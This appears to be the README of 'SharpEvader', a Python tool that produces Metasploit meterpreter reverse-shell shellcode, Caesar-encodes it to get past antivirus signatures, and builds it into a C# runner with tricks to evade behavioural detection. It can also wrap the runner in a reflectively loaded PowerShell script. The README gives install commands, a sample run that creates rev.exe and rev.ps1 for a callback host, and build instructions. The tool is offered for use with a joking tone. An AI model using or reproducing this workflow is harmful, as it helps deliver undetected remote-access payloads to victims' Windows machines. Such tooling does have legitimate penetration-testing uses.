# 🤔 SharpEvader
#### This is a python script which automatically generates meterpreter `tcp`/`https` shellcode and caeser encodes it and slaps some Behavioural detection in a c# Project for you to build and run


# ✨ Features
- Automatically generate's `windows/x64/meterpreter/reverse_https` or `windows/x64/meterpreter/reverse_tcp` shellcode by borrowing `msfvenom`(What more do you expect, Write an `msfvenom` clone from scratch ??) from your linux host.
- Applies some magic sauce inorder to bypass the Signature Based detection.(The magic sauce is absolutely not Caeser Cipher).
- Generate's a C# Project with the encoded shellcode and some more spells to bypass Behavioural Based Detection.
- Quick, Order your Reverse Shell now Available at an easy installment of $999 each :)
- Powershell Script to generate a reflection ps1 script with the C# executable embedded inside it[Tested as of 1st July 2022].
- Does not use Java !!!
- Owner's or Contributor's of this repo does not take responsibiltes of any damages caused using it or with it, any illegal usage is highly discouraged.


# ⚙️ Requirements
- Python3.7+
- msfvenom or Metasploit Framework
- mono-mcs C# compiler package
- Powershell on Linux[Optional]
```bash
sudo apt update && sudo apt install python3 metasploit-framework mono-mcs powershell
# Metasploit-framework & Powershell are defaultly available on Kali & hopefully parrot(If your distro doesn't have it then its your headache)
```

# 🤸 Usage

## [Automatic Method]Run SharpEvader.py which would give you compiled exe and ps1 script inside the output folder
```bash
~/SharpEvader > python3 sharpevader.py

 ____  _                      _____                _           
/ ___|| |__   __ _ _ __ _ __ | ____|_   ____ _  __| | ___ _ __ 
\___ \| '_ \ / _` | '__| '_ \|  _| \ \ / / _` |/ _` |/ _ \ '__|
 ___) | | | | (_| | |  | |_) | |___ \ V / (_| | (_| |  __/ |   
|____/|_| |_|\__,_|_|  | .__/|_____| \_/ \__,_|\__,_|\___|_|   
                       |_|                                     
	
LHOST: 10.10.14.1
LPORT: 9001
PAYLOAD TYPE(tcp/https): tcp
[*] Using LHOST as 10.10.14.1, LPORT as 9001 and PAYLOAD as windows/x64/meterpreter/reverse_tcp
[*] Generating msfvenom shellcode...
[+] MSFVenom Shellcode generation successful
[+] Encoded shellcode with caeser cipher with +7 as Key
[*] Deleting the msf_shellcode.hex file as no one wants it anymore
[*] Baking the fresh Shellcode into a C# project for compiling
[+] Your C# shellcode runner is baked successfully, and it smells nice !!!
[+] C# Compiler found, Time for some frosting on the cake ^_^
[+] Your cake has been frosted successfully and named output/10.10.14.1_9001_tcp/rev.exe
[+] Powershell Found, Let\'s Box up your frosted cake...
[+] Boxed it up and named output/10.10.14.1_9001_tcp/rev.ps1
[+] Happy Evasion using 10.10.14.1_9001_tcp!!!

~/SharpEvader/output/10.10.14.1_9001_tcp >  ls -l
total 16
drwxr-xr-x 3 root root 4096 Aug  9 17:26 csharp
-rwxr-xr-x 1 root root 5120 Aug  9 17:26 rev.exe
-rw-r--r-- 1 root root 3308 Aug  9 17:26 rev.ps1
```

---

## [Manual Method]The C# project directory would be placed inside the output directory with name [[LHOST]_[LPORT]_[PAYLOADTYPE]]/csharp/
```bash
~/SharpEvader/output/10.10.14.1_9001_tcp/csharp > ls -l
total 24
-rwxr-xr-x 1 root root  189 Aug  9 17:26 App.config
-rwxr-xr-x 1 root root 4135 Aug  9 17:26 Program.cs
drwxr-xr-x 2 root root 4096 Aug  9 17:26 Properties
-rwxr-xr-x 1 root root 3189 Aug  9 17:26 rev.csproj
-rwxr-xr-x 1 root root  892 Aug  9 17:26 rev.sln
```

## To be done on Windows
- Transfer the rev_exe_[timestamp] from the output directory and launch `rev.sln` using `Visual Studio`.
- Build the Project using the `Release` and `x64` build configuration.
- Voila !!! The built C# executable would be available in the `rev_exe_[timestamp]/bin/x64/Release/rev.exe`

---

## [Optional] Can be done in Windows/Linux with powershell available
- Execute the `reflection_pwsh_gen.ps1` supplying the `-File` argument as the absolute path to the `rev.exe`
- This would generate a `rev.ps1` which would be consist the C# binary embedded into a ps1 script which would be reflectively loaded in the memory.

---

```bash
~/SharpEvader > pwsh reflection_pwsh_gen.ps1 -File ~/SharpEvader/output/rev_exe_01072022021313AM/bin/x64/Release/rev.exe
[+] Written the C# Embedded Reflection Reverse Shell into rev.ps1
```


# ‼️ Disclaimer

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.